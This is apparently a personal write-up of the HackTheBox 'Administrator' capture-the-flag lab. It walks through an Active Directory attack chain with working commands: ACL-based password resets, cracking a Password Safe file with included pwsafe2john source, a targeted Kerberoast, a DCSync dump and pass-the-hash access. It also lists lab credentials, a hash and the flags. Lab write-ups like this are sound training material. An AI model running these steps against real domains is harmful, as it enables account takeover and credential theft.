```json
Alias: Administrator
Date: 07-04_2025
Platform: Hackthebox
OS: Windows
Difficulty: Medium
Status: Complete
IP: 10.10.11.42
```

# Administrator
# Summary

ACL Abuse -> Password Safe -> DCSync
 
---

# Information Gathering

## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 13:26 PKT
Nmap scan report for 10.10.11.42
Host is up (0.17s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-07 15:26:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-04-07T15:26:55
|_  start_date: N/A
|_clock-skew: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.28 seconds

```

As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich

| Username | Password     |
| -------- | ------------ |
| olivia   | ichliebedich |

---
# Enumeration

Looking at bloodhound, the attack path seems pretty simple

![[Pasted image 20250407134809.png]]

I'm not sure what the Share Moderators group does but we'll find out.

---

# Lateral Movement

### Olivia -> Michael

We have GenericAll over Michael as Olivia so change password

```bash
net rpc password "Michael" "newP@ssword2022" -U "Administrator.htb"/"Olivia"%"ichliebedich" -S $IP
```

### Michael -> Benjamin

We have ForceChangePassword so chang password

```bash
net rpc password "Benjamin" "newP@ssword2022" -U "Administrator.htb"/"Michael"%"newP@ssword2022" -S $IP
```

Now, it seems that we can access the FTP share with the user Benjamin. There is a `Backup.pwsafe3` file, which is simple to crack with hashcat `-m 5200`, but recently hashcat won't run on my machine no matter what I try. Here's how to do it with john

Get this pwsafe.c file:

```c
/* pwsafe2john processes input Password Safe files into a format suitable
 * for use with JtR.
 *
 * This software is Copyright (c) 2012, Dhiru Kholia <dhiru.kholia at gmail.com>,
 * and it is hereby released to the general public under the following terms:
 * Redistribution and use in source and binary forms, with or without modification,
 * are permitted.
 *
 * Password Safe file format:
 *
 * 1. http://keybox.rubyforge.org/password-safe-db-format.html
 *
 * 2. formatV3.txt at http://passwordsafe.svn.sourceforge.net/viewvc/passwordsafe/trunk/pwsafe/pwsafe/docs/
 *
 * Output Format: filename:$passwordsaf$*version*salt*iterations*hash */

#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <errno.h>
#include <string.h>
#include <assert.h>
#include <stdint.h>

static char *magic = "PWS3";

/* helper functions for byte order conversions, header values are stored
 * in little-endian byte order */
static uint32_t fget32(FILE * fp)
{
	uint32_t v = fgetc(fp);
	v |= fgetc(fp) << 8;
	v |= fgetc(fp) << 16;
	v |= fgetc(fp) << 24;
	return v;
}


static void print_hex(unsigned char *str, int len)
{
	int i;
	for (i = 0; i < len; ++i)
		printf("%02x", str[i]);
}

static void process_file(const char *filename)
{
	FILE *fp;
	int count;
	unsigned char buf[32];
	unsigned int iterations;

	if (!(fp = fopen(filename, "rb"))) {
		fprintf(stderr, "! %s: %s\n", filename, strerror(errno));
		return;
	}
	count = fread(buf, 4, 1, fp);
	assert(count == 1);
	if(memcmp(buf, magic, 4)) {
		fprintf(stderr, "%s : Couldn't find PWS3 magic string. Is this a Password Safe file?\n", filename);
		exit(1);
	}
	count = fread(buf, 32, 1, fp);
	assert(count == 1);
	iterations = fget32(fp);

	printf("%s:$pwsafe$*3*", filename);
	print_hex(buf, 32);
	printf("*%d*", iterations);
	count = fread(buf, 32, 1, fp);
	assert(count == 1);
	print_hex(buf,32);
	printf("\n");

	fclose(fp);
}

int main(int argc, char **argv)
{
	int i;

	if (argc < 2) {
		puts("Usage: pwsafe2john [.psafe3 files]");
		return -1;
	}
	for (i = 1; i < argc; i++)
		process_file(argv[i]);

	return 0;
}
```

Compile it:

```bash
gcc pwsafe2john.c -o pwsafe
```

Convert to john format and crack

```bash
./pwsafe Backup.pwsafe3 > pwsafe.dump
john pwsafe.dump --wordlist=rockyou.txt
```

and we get the password: `tekieromucho`. Next we need to install Password Safe and open the file with it.

The safe contains the password for Emily

| Username | Password                      |
| -------- | ----------------------------- |
| Emily    | UXLCI5iETUsIBoFVTj8yQFKoHjXmb |

---

# Privilege Escalation

![[Pasted image 20250407155538.png]]

With Emily the path to domain admin is clear.

## Emily -> Ethan

Since we have GenericWrite, We can make Ethan a service account, and request a TGS from it. With which we will try to crack their password. This is called a Targeted Kerberoast.

Use https://github.com/ShutdownRepo/targetedKerberoast:

```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

save the ticket and crack:

```bash
john hash --wordlist=rockyou.txt
```

with which we get the password:

| Username | Password   |
| -------- | ---------- |
| ethan    | limpbizkit |

### Ethan -> Domain Admin

Since Ethan has DCSync rights, we can get all the hashes stored in the DC.

```bash
secretsdump.py administrator.htb/ethan@$IP
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
```

```bash
evil-winrm -i $IP -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```


---

# Flags
- 5b877926695b23e6e12cdf4bdf500ee5
- d42047239c11f7b1d4e03f7bef11385b

#CTF